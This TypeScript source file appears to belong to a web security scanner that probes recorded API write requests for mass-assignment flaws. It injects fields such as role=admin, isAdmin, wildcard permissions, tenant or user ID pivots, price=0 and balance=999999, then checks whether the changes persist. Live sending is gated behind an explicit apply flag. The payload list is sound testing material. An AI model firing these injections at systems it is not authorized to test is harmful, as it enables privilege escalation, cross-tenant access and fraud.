import { captureVerification, evaluateVerification, sendParameterRequest, successfulResponse, type ParameterProof, type ParameterVerification } from "./parameterVerification.js";
import { writeArtifact } from "../adapters/artifacts.js";
import { type RoleOverride } from "../core/credentials.js";
import { exactResponseValue, injectParameter, loadParameterSamples, prepareParameterRequest, type ParameterRequest } from "./parameterModel.js";

export interface MassAssignInput {
  readonly recordRoot: string;
  readonly outputRoot: string;
  readonly credential?: string;
  readonly credentialOverrides?: RoleOverride;
  readonly exchangeIds?: readonly string[];
  readonly fields?: readonly string[];
  readonly proxy?: string;
  readonly timeoutMs?: number;
  readonly maxExchanges?: number;
  /** Explicitly authorizes baseline and injected writes; default sends nothing. */
  readonly apply?: boolean;
  readonly verification?: ParameterVerification;
}
export interface InjectOutcome {
  readonly exchangeId: string;
  readonly method: string;
  readonly url: string;
  readonly field: string;
  readonly value: string;
  readonly baselineStatus: number;
  readonly replayStatus: number;
  readonly verdict: "reflected" | "accepted-changed" | "persisted-change" | "permission-change" | "rejected" | "same-response" | "error" | "dry-run";
  readonly outcome: "confirmed" | "lead" | "unproven";
  readonly verification?: ParameterProof;
  readonly note: string;
}
export interface MassAssignResult {
  readonly probed: number;
  readonly outcomes: InjectOutcome[];
  /** Only independently verified persistence/permission effects are sinks. */
  readonly sinks: InjectOutcome[];
  readonly leads: InjectOutcome[];
  readonly artifacts: { path: string; bytes: number }[];
}
const INJECT_FIELDS: ReadonlyArray<{field:string;value:unknown;note:string}> = [
  {field:"role",value:"admin",note:"role escalation"},
  {field:"roles",value:["admin"],note:"role list escalation"},
  {field:"isAdmin",value:true,note:"admin flag"},
  {field:"is_admin",value:true,note:"admin flag"},
  {field:"admin",value:true,note:"admin flag"},
  {field:"permissions",value:["*"],note:"wildcard permissions"},
  {field:"scopes",value:["*"],note:"wildcard scopes"},
  {field:"user_id",value:1,note:"ownership pivot"},
  {field:"userId",value:1,note:"ownership pivot"},
  {field:"account_id",value:1,note:"cross-account pivot"},
  {field:"tenant_id",value:1,note:"cross-tenant pivot"},
  {field:"organizationId",value:1,note:"cross-org pivot"},
  {field:"verified",value:true,note:"self-verify"},
  {field:"isVerified",value:true,note:"self-verify"},
  {field:"email_verified",value:true,note:"verification change"},
  {field:"active",value:true,note:"reactivation"},
  {field:"plan",value:"enterprise",note:"plan escalation"},
  {field:"subscription",value:"premium",note:"subscription escalation"},
  {field:"price",value:0,note:"price override"},
  {field:"balance",value:999999,note:"balance injection"},
  {field:"quota",value:999999,note:"quota injection"},
];

export const probeMassAssign = async (input: MassAssignInput): Promise<MassAssignResult> => {
  const samples=(await loadParameterSamples(input.recordRoot))
    .filter(e=>["POST","PUT","PATCH"].includes(e.method))
    .filter(e=>e.status!==null&&e.status>=200&&e.status<300)
    .filter(e=>!input.exchangeIds||input.exchangeIds.includes(e.id)).slice(0,input.maxExchanges??15);
  const fields=input.fields?INJECT_FIELDS.filter(f=>input.fields!.includes(f.field)):INJECT_FIELDS;
  const outcomes:InjectOutcome[]=[]; let probed=0;
  for(const e of samples){
    const override=input.credentialOverrides||input.credential!==undefined?{credential:input.credential,...input.credentialOverrides}:undefined;
    const request=prepareParameterRequest(e,override);
    const injections=fields.flatMap(f=>{const changed=injectParameter(request,f.field,f.value);return changed?[{f,changed}]:[];});
    if(!injections.length)continue;
    if(input.apply!==true){
      for(const {f} of injections)outcomes.push({exchangeId:e.id,method:e.method,url:e.url,field:f.field,value:JSON.stringify(f.value),baselineStatus:e.status??0,replayStatus:-1,verdict:"dry-run",outcome:"unproven",note:f.note});
      continue;
    }
    const opts={proxy:input.proxy,timeoutMs:input.timeoutMs??10000};
    const send=(req:ParameterRequest)=>sendParameterRequest(req,opts);
    const live=await send(request); probed++;
    if(!successfulResponse(live))continue;
    for(const {f,changed} of injections){
      const before=input.verification?await captureVerification(input.verification,request,opts):[];
      const r=await send(changed);
      const after=input.verification&&successfulResponse(r)?await captureVerification(input.verification,request,opts):[];
      const verification=input.verification?evaluateVerification(input.verification,request,before,after,f.field,f.value):undefined;
      const reflected=exactResponseValue(r.body,f.field,f.value)&&!exactResponseValue(live.body,f.field,f.value);
      const different=live.status!==r.status||live.sha256!==r.sha256;
      const verdict:InjectOutcome["verdict"]=verification?.confirmed?(verification.kind==="re-read"?"persisted-change":"permission-change"):!successfulResponse(r)&&!(r.status>=400&&r.status<500)?"error":successfulResponse(r)&&reflected?"reflected":successfulResponse(r)&&different?"accepted-changed":r.status>=400&&r.status<500?"rejected":"same-response";
      outcomes.push({exchangeId:e.id,method:e.method,url:e.url,field:f.field,value:JSON.stringify(f.value),baselineStatus:live.status,replayStatus:r.status,verdict,outcome:verification?.confirmed?"confirmed":verdict==="reflected"||verdict==="accepted-changed"?"lead":"unproven",verification,note:verification?.confirmed?verification.reason:verdict==="reflected"?"exact value echoed; persistence unverified":f.note});
    }
  }
  const leads=outcomes.filter(o=>o.outcome==="lead"); const sinks=outcomes.filter(o=>o.outcome==="confirmed");
  const art=await writeArtifact(input.outputRoot,"mass_assign.json",JSON.stringify({probed,outcomes,leads,sinks},null,2));
  return {probed,outcomes,leads,sinks,artifacts:[art]};
};
